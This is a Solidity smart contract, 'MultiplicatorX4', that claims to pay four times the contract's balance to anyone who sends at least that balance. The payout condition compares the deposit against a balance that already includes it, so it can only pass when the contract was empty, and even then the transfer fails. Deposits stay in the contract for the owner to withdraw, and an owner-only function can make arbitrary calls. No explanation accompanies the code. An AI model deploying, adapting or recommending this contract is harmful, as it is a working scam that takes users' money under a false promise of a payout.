pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public Owner;

    function MultiplicatorX4() public {
        Owner = msg.sender;
    }

    function() public payable {}

    function withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function command(address _address, bytes _data) public payable {
        require(msg.sender == Owner);
        require(_address != address(0));
        require(_data.length > 0);
        _address.call.value(msg.value)(_data);
    }

    function multiplicator(address _address) public payable {
        require(_address != address(0));
        require(msg.value > 0);
        if (msg.value >= this.balance) {
            _address.transfer(this.balance * 4);
        }
    }
}